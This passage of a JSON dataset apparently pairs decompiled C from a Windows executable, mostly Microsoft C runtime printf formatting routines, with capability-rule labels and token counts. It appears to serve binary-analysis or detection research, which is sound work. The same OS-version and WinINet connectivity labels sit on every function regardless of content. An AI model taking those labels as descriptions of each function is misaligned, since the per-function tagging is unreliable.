        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406b00(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    uint var_30h;\n    uint var_29h;\n    char **var_20h;\n    char *var_14h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    puVar3 = &fcn.00406b00::var_30h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.004061b0();\n    iVar1 = fcn.00406150();\n    var_14h = iVar2 + -1 + iVar1;\n    var_20h = fcn.00408c80();\n    *var_20h = var_14h;\n    while ((0 < *(var_8h + 0x28) || (iVar4 != 0))) {\n        *(var_8h + 0x28) = *(var_8h + 0x28) + -1;\n        var_29h._0_1_ = fcn.00411550(iVar4, arg_10h, 0);\n        var_29h._0_1_ = var_29h + '0';\n        iVar4 = fcn.004114e0();\n        if ('9' < var_29h) {\n            var_29h._0_1_ = fcn.00407500(var_29h, arg_14h & 0xff);\n        }\n        **var_20h = var_29h;\n        *var_20h = *var_20h + -1;\n    }\n    *(var_8h + 0x38) = var_14h - *var_20h;\n    *var_20h = *var_20h + 1;\n    uStack8 = 0x406c0b;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 522
    },
    "00407210": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407210(int32_t **param_1)\n\n{\n    uint var_8h;\n    \n    if ((**param_1 == 0) && (param_1[1] != NULL)) {\n        **param_1 = param_1[1];\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "004075b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004075b0(char *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char **var_dch;\n    uint var_1ch;\n    char *var_14h;\n    uint var_5h;\n    \n    puVar4 = &fcn.004075b0::var_1ch;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    if (arg_ch == NULL) {\n        var_dch = sub.msvcrt.dll_localeconv();\n    }\n    else {\n        var_dch = *(*arg_ch + 0xbc);\n    }\n    var_5h._0_1_ = **var_dch;\n    for (; (*arg_8h != '\\0' && (*arg_8h != var_5h)); arg_8h = arg_8h + 1) {\n    }\n    if (*arg_8h != '\\0') {\n        do {\n            pcVar2 = arg_8h;\n            arg_8h = pcVar2 + 1;\n            if ((*arg_8h == '\\0') || (*arg_8h == 'e')) break;\n        } while (*arg_8h != 'E');\n        var_14h = arg_8h;\n        for (arg_8h = pcVar2; *arg_8h == '0'; arg_8h = arg_8h + -1) {\n        }\n        if (*arg_8h == var_5h) {\n            arg_8h = arg_8h + -1;\n        }\n        do {\n            cVar1 = *var_14h;\n            var_14h = var_14h + 1;\n            arg_8h = arg_8h + 1;\n            *arg_8h = cVar1;\n        } while (cVar1 != '\\0');\n    }\n    stack0xfffffff8 = 0x4076fa;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 504
    },
    "004077d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004077d0(uint8_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint8_t **var_dch;\n    uint var_1ch;\n    uint var_11h;\n    uint var_5h;\n    \n    puVar4 = &fcn.004077d0::var_1ch;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    cVar1 = fcn.0040a570(*arg_8h, arg_ch);\n    if (cVar1 != 'e') {\n        do {\n            arg_8h = arg_8h + 1;\n            iVar2 = fcn.0040a530(*arg_8h, arg_ch);\n        } while (iVar2 != 0);\n    }\n    cVar1 = fcn.0040a570(*arg_8h, arg_ch);\n    if (cVar1 == 'x') {\n        arg_8h = arg_8h + 2;\n    }\n    var_5h._0_1_ = *arg_8h;\n    if (arg_ch == NULL) {\n        var_dch = sub.msvcrt.dll_localeconv();\n    }\n    else {\n        var_dch = *(*arg_ch + 0xbc);\n    }\n    *arg_8h = **var_dch;\n    do {\n        arg_8h = arg_8h + 1;\n        var_11h._0_1_ = *arg_8h;\n        *arg_8h = var_5h;\n        var_5h._0_1_ = var_11h;\n    } while (*arg_8h != 0);\n    stack0xfffffff8 = 0x4078d6;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 467
    },
    "004078e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004078e0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    int32_t *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004078e0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    if (*param_1 == 0) {\n        iVar1 = sub.msvcrt.dll__errno();\n        *var_8h = iVar1;\n    }\n    uStack8 = 0x407927;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 192
    },
    "00407ad0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407c49)\n// WARNING: Variable defined which should be unmapped: var_f4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407ad0(void)\n\n{\n    uint32_t noname_5;\n    code *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint32_t arg_8h;\n    uint uVar4;\n    int32_t iVar5;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint arg_ch;\n    uint32_t var_f4h;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint var_34h;\n    uint var_29h;\n    int32_t var_20h;\n    uint32_t var_14h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00407ad0::var_34h;\n    for (iVar5 = 0xd; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar2 = fcn.00409e20();\n    if (cVar2 != '\\0') {\n        var_f4h = *(var_8h + 0x10) != 0;\n        var_14h = var_f4h;\n        if ((var_f4h == 0) &&\n           (iVar5 = fcn.00405830(2, 0x4135a0, 0x665, 0, 0x41322c, L\"_format_it != nullptr\"),  iVar5 == 1)) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (var_14h == 0) {\n            puVar3 = sub.msvcrt.dll__errno();\n            *puVar3 = 0x16;\n            fcn.00405a50(L\"_format_it != nullptr\", \n                         L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::process\"\n                         , 0x4135a0, 0x665, 0);\n        }\n        else {\n            while (cVar2 = fcn.00407550(),  cVar2 != '\\0') {\n                *(var_8h + 0x38) = 0;\n                *(var_8h + 0x1c) = 0;\n                while( true ) {\n                    cVar2 = **(var_8h + 0x10);\n                    *(var_8h + 0x10) = *(var_8h + 0x10) + 1;\n                    *(var_8h + 0x31) = cVar2;\n                    if ((cVar2 == '\\0') || (*(var_8h + 0x18) < 0)) break;\n                    arg_ch = *(var_8h + 0x1c);\n                    arg_8h = *(var_8h + 0x31);\n                    uVar4 = fcn.00407700(arg_8h, arg_ch);\n                    *(var_8h + 0x1c) = uVar4;\n                    cVar2 = fcn.00407e40();\n                    if (cVar2 == '\\0') goto code_r0x00407d88;\n                    if (*(var_8h + 0x1c) == 8) {\n                        var_20h = 0;\n                        iVar5 = fcn.00405830(2, 0x4135a0, 0x679, 0, 0x41322c, L\"(\\\"Incorrect format specifier\\\", 0)\");\n                        if (iVar5 == 1) {\n                            pcVar1 = swi(3);\n                            (*pcVar1)();\n                            return;\n                        }\n                        if (var_20h == 0) {\n                            puVar3 = sub.msvcrt.dll__errno();\n                            *puVar3 = 0x16;\n                            fcn.00405a50(L\"(\\\"Incorrect format specifier\\\", 0)\", \n                                         L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::process\"\n                                         , 0x4135a0, 0x679, 0);\n                            goto code_r0x00407d88;\n                        }\n                    }\n                    var_29h._0_1_ = '\\0';\n                    noname_5 = *(var_8h + 0x1c);\n                    if (noname_5 < 8) {\n    // switch table (8 cases) at 0x407d9c\n                        switch(*(noname_5 * 4 + 0x407d9c)) {\n                        case 0x407cf1:\n                            var_29h._0_1_ = fcn.00407f90();\n                            break;\n                        case 0x407cfe:\n                            var_29h._0_1_ = fcn.00408230();\n                            break;\n                        case 0x407d0b:\n                            var_29h._0_1_ = fcn.00407eb0();\n                            break;\n                        case 0x407d18:\n                            var_29h._0_1_ = fcn.00408b80();\n                            break;\n                        case 0x407d25:\n                            var_29h._0_1_ = fcn.00407e80();\n                            break;\n                        case 0x407d32:\n                            var_29h._0_1_ = fcn.00408280();\n                            break;\n                        case 0x407d3f:\n                            var_29h._0_1_ = fcn.00408310();\n                            break;\n                        case 0x407d4c:\n                            var_29h._0_1_ =\n                                 fcn.00408740(arg_8h, arg_ch, arg_8h, unaff_ESI, unaff_EBX, noname_5, in_stack_ffffff0c\n                                              , in_stack_ffffff10, in_stack_ffffff14, in_stack_ffffff18, \n                                              in_stack_ffffff1c);\n                        }\n                    }\n                    if (var_29h == '\\0') goto code_r0x00407d88;\n                }\n                cVar2 = fcn.00407e40();\n                if (cVar2 == '\\0') break;\n            }\n        }\n    }\ncode_r0x00407d88:\n    uStack8 = 0x407d98;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1538
    },
    "00407f90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00407f90(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t var_dch;\n    uint var_1ch;\n    uint32_t var_14h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00407f90::var_1ch;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar2 = fcn.00407e60();\n    if (cVar2 == '\\0') {\n        cVar2 = fcn.00408070();\n        var_dch = cVar2 != '\\0';\n        var_14h = var_dch;\n        if ((var_dch == 0) &&\n           (iVar4 = fcn.00405830(2, 0x4135a0, 0x6a6, 0, 0x41322c, L\"state_case_normal_common()\"),  iVar4 == 1)) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (var_14h == 0) {\n            puVar3 = sub.msvcrt.dll__errno();\n            *puVar3 = 0x16;\n            fcn.00405a50(L\"state_case_normal_common()\", \n                         L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::state_case_normal\"\n                         , 0x4135a0, 0x6a6, 0);\n        }\n    }\n    uStack8 = 0x408065;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 443
    },
    "004080f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004080f0(int32_t param_1)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t var_dch;\n    uint var_1ch;\n    uint32_t var_14h;\n    uint uStack16;\n    int32_t var_8h;\n    \n    puVar3 = &fcn.004080f0::var_1ch;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    *(param_1 + 0x3c) = 0;\n    var_8h = param_1;\n    iVar4 = fcn.0040a3b0(*(param_1 + 0x31), *(param_1 + 8));\n    if (iVar4 != 0) {\n        fcn.00409fe0(*(var_8h + 0x31), var_8h + 0x18);\n        uVar1 = **(var_8h + 0x10);\n        *(var_8h + 0x10) = *(var_8h + 0x10) + 1;\n        *(var_8h + 0x31) = uVar1;\n        var_dch = *(var_8h + 0x31) != '\\0';\n        var_14h = var_dch;\n        if ((var_dch == 0) &&\n           (iVar4 = fcn.00405830(2, 0x4135a0, 0x6be, 0, 0x41322c, L\"_format_char != \\'\\\\0\\'\"),  iVar4 == 1)) {\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if (var_14h == 0) {\n            puVar3 = sub.msvcrt.dll__errno();\n            *puVar3 = 0x16;\n            fcn.00405a50(L\"_format_char != \\'\\\\0\\'\", \n                         L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::state_case_normal_tchar\"\n                         , 0x4135a0, 0x6be, 0);\n        }\n    }\n    uStack16 = 0x408222;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 587
    },
    "00408280": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408280(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    int32_t var_8h;\n    \n    puVar3 = &fcn.00408280::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = param_1;\n    if (*(param_1 + 0x31) == '*') {\n        cVar1 = fcn.00409dd0();\n        if (((cVar1 != '\\0') && (cVar1 = fcn.00407e40(),  cVar1 != '\\0')) && (*(var_8h + 0x28) < 0)) {\n            *(var_8h + 0x28) = 0xffffffff;\n        }\n    }\n    else {\n        fcn.00407990(param_1 + 0x28);\n    }\n    var_8h = 0x408308;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 274
    },
    "00408310": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004083cc)\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: var_e8h\n\nvoid __fastcall fcn.00408310(uint32_t *param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint var_ech;\n    uint32_t var_e8h;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint var_2ch;\n    uint32_t var_20h;\n    int32_t var_14h;\n    uint32_t *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00408310::var_2ch;\n    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    if (*(param_1 + 0x31) == 'F') {\n        if ((*param_1 & 8) == 0) {\n            param_1[7] = 7;\n            fcn.00408740(unaff_EDI, unaff_ESI, unaff_EBX, 0, 0, in_stack_ffffff18, in_stack_ffffff1c, in_stack_ffffff20\n                         , in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c);\n        }\n    }\n    else if (*(param_1 + 0x31) == 'N') {\n        if ((*param_1 & 8) == 0) {\n            param_1[7] = 8;\n            var_14h = 0;\n            iVar3 = fcn.00405830(2, 0x4135a0, 0x763, 0, 0x41322c, L\"(\\\"N length modifier not specifier\\\", false)\");\n            if (iVar3 == 1) {\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if (var_14h == 0) {\n                puVar2 = sub.msvcrt.dll__errno();\n                *puVar2 = 0x16;\n                fcn.00405a50(L\"(\\\"N length modifier not specifier\\\", false)\", \n                             L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::state_case_size\"\n                             , 0x4135a0, 0x763, 0);\n            }\n        }\n    }\n    else {\n        var_e8h = param_1[0xb] == 0;\n        var_20h = var_e8h;\n        if ((var_e8h == 0) &&\n           (iVar3 = fcn.00405830(2, 0x4135a0, 0x76a, 0, 0x41322c, L\"_length == length_modifier::none\"),  iVar3 == 1)) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (var_20h == 0) {\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x16;\n            fcn.00405a50(L\"_length == length_modifier::none\", \n                         L\"__crt_stdio_output::output_processor<char,class __crt_stdio_output::stream_output_adapter<char>,class __crt_stdio_output::standard_base<char,class __crt_stdio_output::stream_output_adapter<char> > >::state_case_size\"\n                         , 0x4135a0, 0x76a, 0);\n        }\n        else if (*(var_8h + 0x31) - 0x49U < 0x32) {\n    // switch table (50 cases) at 0x4086d8\n            switch(*(*(*(var_8h + 0x31) + 0x4086b7) * 4 + 0x4086d8)) {\n            case 0x408522:\n                if (*var_8h[4] == 'h') {\n                    var_8h[4] = var_8h[4] + 1;\n                    var_8h[0xb] = 1;\n                }\n                else {\n                    var_8h[0xb] = 2;\n                }\n                break;\n            case 0x40855c:\n                if ((*var_8h[4] == '3') && (*(var_8h[4] + 1) == '2')) {\n                    var_8h[4] = var_8h[4] + 2;\n                    var_8h[0xb] = 10;\n                }\n                else if ((*var_8h[4] == '6') && (*(var_8h[4] + 1) == '4')) {\n                    var_8h[4] = var_8h[4] + 2;\n                    var_8h[0xb] = 0xb;\n                }\n                else if ((((*var_8h[4] == 'd') || (*var_8h[4] == 'i')) || (*var_8h[4] == 'o')) ||\n                        (((*var_8h[4] == 'u' || (*var_8h[4] == 'x')) || (*var_8h[4] == 'X')))) {\n                    var_8h[0xb] = 9;\n                }\n                break;\n            case 0x408634:\n                if (*var_8h[4] == 'l') {\n                    var_8h[4] = var_8h[4] + 1;\n                    var_8h[0xb] = 4;\n                }\n                else {\n                    var_8h[0xb] = 3;\n                }\n                break;\n            case 0x40866b:\n                var_8h[0xb] = 8;\n                break;\n            case 0x408679:\n                var_8h[0xb] = 5;\n                break;\n            case 0x408687:\n                var_8h[0xb] = 7;\n                break;\n            case 0x408695:\n                var_8h[0xb] = 6;\n                break;\n            case 0x4086a3:\n                var_8h[0xb] = 0xc;\n                break;\n            case 0x4086b1:\n                var_8h[0xb] = 0xd;\n            }\n        }\n    }\n    uStack8 = 0x4086d1;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1584
    },
    "00408740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00408740(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    char cVar1;\n    uchar uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    int32_t extraout_EDX_07;\n    int32_t extraout_EDX_08;\n    int32_t extraout_EDX_09;\n    uint extraout_EDX_10;\n    uint *puVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint32_t var_118h;\n    uint var_58h;\n    int32_t var_50h;\n    uint var_41h;\n    uchar auStack60 [3];\n    uint var_35h;\n    int32_t var_2ch;\n    uint var_20h;\n    uint var_11h;\n    int32_t var_8h;\n    \n    puVar5 = &fcn.00408740::var_58h;\n    for (iVar4 = 0x16; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0xcccccccc;\n        puVar5 = puVar5 + 1;\n    }\n    var_11h._0_1_ = '\\0';\n    iVar4 = *(in_ECX + 0x31) + -0x41;\n    var_8h = in_ECX;\n    // switch table (56 cases) at 0x408b0c\n    switch(*(in_ECX + 0x31)) {\n    case 'A':\n    case 'E':\n    case 'F':\n    case 'G':\n    case 'a':\n    case 'e':\n    case 'f':\n    case 'g':\n        var_11h._0_1_ = fcn.00408f00();\n        iVar4 = extraout_EDX_02;\n        break;\n    case 'C':\n    case 'c':\n        var_11h._0_1_ = fcn.00409230();\n        iVar4 = extraout_EDX;\n        break;\n    case 'S':\n    case 's':\n        var_11h._0_1_ = fcn.00409b60();\n        iVar4 = extraout_EDX_01;\n        break;\n    case 'X':\n        var_11h._0_1_ = fcn.00408d80();\n        iVar4 = extraout_EDX_06;\n        break;\n    case 'Z':\n        var_11h._0_1_ = fcn.00408dc0();\n        iVar4 = extraout_EDX_00;\n        break;\n    case 'd':\n    case 'i':\n        var_11h._0_1_ = fcn.00409400();\n        iVar4 = extraout_EDX_03;\n        break;\n    case 'n':\n        var_11h._0_1_ = fcn.00409840();\n        iVar4 = extraout_EDX_09;\n        break;\n    case 'o':\n        var_11h._0_1_ = fcn.00409aa0();\n        iVar4 = extraout_EDX_05;\n        break;\n    case 'p':\n        var_11h._0_1_ = fcn.00409b00();\n        iVar4 = extraout_EDX_08;\n        break;\n    case 'u':\n        var_11h._0_1_ = fcn.00409cd0();\n        iVar4 = extraout_EDX_04;\n        break;\n    case 'x':\n        var_11h._0_1_ = fcn.00409d10();\n        iVar4 = extraout_EDX_07;\n    }\n    if (var_11h == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        uVar6 = fcn.00407e60();\n        iVar4 = uVar6 >> 0x20;\n        if ((uVar6 & 0xff) == 0) {\n            if (*(var_8h + 0x30) == '\\0') {\n                var_20h._0_2_ = 0;\n                var_20h._2_1_ = 0;\n                var_2ch = 0;\n                cVar1 = fcn.00407930(0x10);\n                if (cVar1 != '\\0') {\n                    cVar1 = fcn.00407930(0x40);\n                    if (cVar1 == '\\0') {\n                        cVar1 = fcn.00407930(1);\n                        if (cVar1 == '\\0') {\n                            cVar1 = fcn.00407930(2);\n                            if (cVar1 != '\\0') {\n                                *(&fcn.00408740::var_20h + var_2ch) = 0x20;\n                                var_2ch = var_2ch + 1;\n                            }\n                        }\n                        else {\n                            *(&fcn.00408740::var_20h + var_2ch) = 0x2b;\n                            var_2ch = var_2ch + 1;\n                        }\n                    }\n                    else {\n                        *(&fcn.00408740::var_20h + var_2ch) = 0x2d;\n                        var_2ch = var_2ch + 1;\n                    }\n                }\n                if (((*(var_8h + 0x31) == 'x') || (*(var_8h + 0x31) == 'X')) &&\n                   (cVar1 = fcn.00407930(0x20),  cVar1 != '\\0')) {\n                    var_118h = 0x1000000;\n                }\n                else {\n                    var_118h = 0;\n                }\n                _auStack60 = var_118h | _auStack60 & 0xffffff;\n                if ((*(var_8h + 0x31) == 'a') || (*(var_8h + 0x31) == 'A')) {\n                    var_41h._0_1_ = '\\x01';\n                }\n                else {\n                    var_41h._0_1_ = '\\0';\n                }\n                var_35h._0_1_ = var_118h >> 0x18;\n                if ((var_35h != '\\0') || (var_41h != '\\0')) {\n                    *(&fcn.00408740::var_20h + var_2ch) = 0x30;\n                    var_2ch = var_2ch + 1;\n                    if ((*(var_8h + 0x31) == 'X') || (*(var_8h + 0x31) == 'A')) {\n                        var_118h = 0x1000000;\n                    }\n                    else {\n                        var_118h = 0;\n                    }\n                    uVar2 = fcn.00407500(0x51, var_118h >> 0x18);\n                    *(&fcn.00408740::var_20h + var_2ch) = uVar2;\n                    var_2ch = var_2ch + 1;\n                }\n                var_50h = (*(var_8h + 0x24) - *(var_8h + 0x38)) - var_2ch;\n                cVar1 = fcn.00407930(0xc);\n                if (cVar1 == '\\0') {\n                    fcn.00406c20(var_8h + 0x448, 0x20, var_50h, var_8h + 0x18);\n                }\n                fcn.0040a270(&fcn.00408740::var_20h, var_2ch, var_8h + 0x18, var_8h + 0xc);\n                cVar1 = fcn.00407930(8);\n                if ((cVar1 != '\\0') && (cVar1 = fcn.00407930(4),  cVar1 == '\\0')) {\n                    fcn.00406c20(var_8h + 0x448, 0x30, var_50h, var_8h + 0x18);\n                }\n                fcn.0040a0d0(0);\n                uVar6 = CONCAT44(extraout_EDX_10, var_8h);\n                if (-1 < *(var_8h + 0x18)) {\n                    uVar7 = fcn.00407930(4);\n                    uVar6 = uVar7 & 0xffffffff000000ff;\n                    if ((uVar7 & 0xff) != 0) {\n                        uVar6 = fcn.00406c20(var_8h + 0x448, 0x20, var_50h, var_8h + 0x18);\n                    }\n                }\n                iVar4 = uVar6 >> 0x20;\n                uVar3 = 1;\n            }\n            else {\n                uVar3 = 1;\n            }\n        }\n        else {\n            uVar3 = 1;\n        }\n    }\n    fcn.00411450(uVar3, iVar4);\n    _auStack60 = 0x408ae9;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 2182
    },
    "00408b80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408b80(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    int32_t var_8h;\n    \n    puVar3 = &fcn.00408b80::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = param_1;\n    if (*(param_1 + 0x31) == '*') {\n        cVar1 = fcn.00409d80();\n        if (((cVar1 != '\\0') && (cVar1 = fcn.00407e40(),  cVar1 != '\\0')) && (*(var_8h + 0x24) < 0)) {\n            fcn.00407e10(4);\n            *(var_8h + 0x24) = -*(var_8h + 0x24);\n        }\n    }\n    else {\n        fcn.00407990(param_1 + 0x24);\n    }\n    var_8h = 0x408c16;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 296
    },
    "00408dc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
